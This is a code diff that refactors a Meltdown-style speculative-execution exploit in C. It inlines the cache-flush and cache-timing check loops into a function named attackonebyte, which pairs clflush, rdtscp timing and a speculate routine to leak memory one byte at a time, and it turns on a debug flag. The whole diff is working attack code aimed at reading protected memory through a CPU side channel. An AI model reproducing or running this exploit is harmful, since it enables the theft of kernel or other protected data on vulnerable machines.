@@ -7,7 +7,7 @@
 #define PAGE_SIZE 4 * 1024
 #define ARRAY_SIZE 256
 #define ATTEMP 5
-#define MOREINFO 0
+#define MOREINFO 1
 
 static char target_array[ARRAY_SIZE * PAGE_SIZE];
 static int check_array[ARRAY_SIZE];
@@ -22,13 +22,6 @@ time1 = __rdtscp(&zero);
 (void)*addr;
 time2 = __rdtscp(&zero);
 return time2 - time1;
-}
-
-void clflush()
-{
-	int i;
-	for (i = 0; i < ARRAY_SIZE; i++)
-		_mm_clflush(&target_array[i * PAGE_SIZE]);
 }
 
 extern char stopspeculate[];
@@ -52,21 +45,11 @@ static void speculate(unsigned long addr){
 		: "rax", "rbx"
 	);
 }
-/*检查target数组中那些项进入了缓存*/
-void check(){
-	int i, time;
-	volatile char *addr;
-	for (i = 0; i <ARRAY_SIZE; i++) {
-		addr = &target_array[i * PAGE_SIZE];
-		time = get_access_time(addr);
-		if(time*time<cache_threshold)
-			check_array[i]++;
-	}
-}
+
 
 int attackonebyte(int fd, unsigned long addr)
 {
-	int i,max = -1, max_i = 0;
+	int i,max = -1, max_i = 0,j,k;
 	static char buf[256];
 	memset(check_array, 0, sizeof(check_array));
 	for (i = 0; i < 1000; i++) {
@@ -75,9 +58,18 @@ int attackonebyte(int fd, unsigned long addr)
 			perror("pread");
 			break;
 		}
-		clflush();
+		for (j = 0; j < ARRAY_SIZE; j++)
+			_mm_clflush(&target_array[j * PAGE_SIZE]);
 		speculate(addr);
-		check();
+		int time;
+		/*检查target数组中那些项进入了缓存*/
+	volatile char *addr;
+	for (j = 0; j <ARRAY_SIZE; j++) {
+		addr = &target_array[j * PAGE_SIZE];
+		time = get_access_time(addr);
+		if(time*time<cache_threshold)
+			check_array[j]++;
+	}
 	}
 	max_i=-1;
 	for (i = 0; i < ARRAY_SIZE; i++) {
